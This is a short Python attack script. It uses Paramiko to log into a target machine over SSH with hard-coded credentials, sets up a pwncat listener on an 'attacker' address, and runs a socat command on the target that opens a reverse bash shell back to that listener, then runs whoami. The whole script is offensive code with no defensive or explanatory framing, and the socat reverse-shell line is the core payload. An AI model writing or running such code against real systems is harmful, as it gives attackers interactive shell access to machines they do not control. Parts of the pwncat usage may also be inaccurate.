import paramiko
import pwncat
import time

# Target SSH credentials
target_host = "192.168.1.100"
target_port = 22
username = "targetuser"
password = "targetpassword"

# Attacker listener details
attacker_host = "192.168.1.50"
attacker_port = 4444

# Start pwncat listener
listener = pwncat.listen(f"tcp://{attacker_host}:{attacker_port}")

# Define callback for new session
def on_session_established(session):
    print(f"[+] Reverse shell connected from {session.client}")
    print("Running whoami...")
    print(session.run("whoami"))
    session.close()

listener.established = on_session_established

# Connect to target via SSH using Paramiko
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(target_host, port=target_port, username=username, password=password)

# Deploy socat reverse shell
reverse_shell_cmd = f"socat TCP:{attacker_host}:{attacker_port} EXEC:/bin/bash,pty,stderr,setsid,sigint,sane &"
stdin, stdout, stderr = ssh.exec_command(reverse_shell_cmd)
print("[*] Reverse shell command sent via SSH")

# Close SSH connection
ssh.close()

# Wait for the reverse shell to connect
print("[*] Waiting for reverse shell...")
listener.run()
